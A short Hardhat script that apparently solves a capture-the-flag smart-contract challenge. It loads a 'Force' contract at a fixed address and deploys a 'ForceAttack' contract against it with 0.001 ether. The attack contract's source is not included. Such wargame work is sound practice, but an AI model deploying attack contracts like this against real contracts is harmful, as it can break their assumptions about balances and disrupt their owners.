const hre = require("hardhat");
require("dotenv").config();

async function main() {
    const INSTANCE_ADDRESS = "0x146446662b3690246bA5fae3C608a5717fBd695b";
    const AMOUNT = ethers.utils.parseUnits('0.001', 'ether');

    // Fetch instance contract
    const force = await hre.ethers.getContractAt("Force", INSTANCE_ADDRESS);

    console.log(`Force contract fetched at ${force.address}`);

    // Deploy attack contract
    const ForceAttack = await ethers.getContractFactory("ForceAttack");
    const forceAttack = await ForceAttack.deploy(INSTANCE_ADDRESS, { value: AMOUNT });

    console.log(`ForceAttack contract deployed at ${forceAttack.address}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});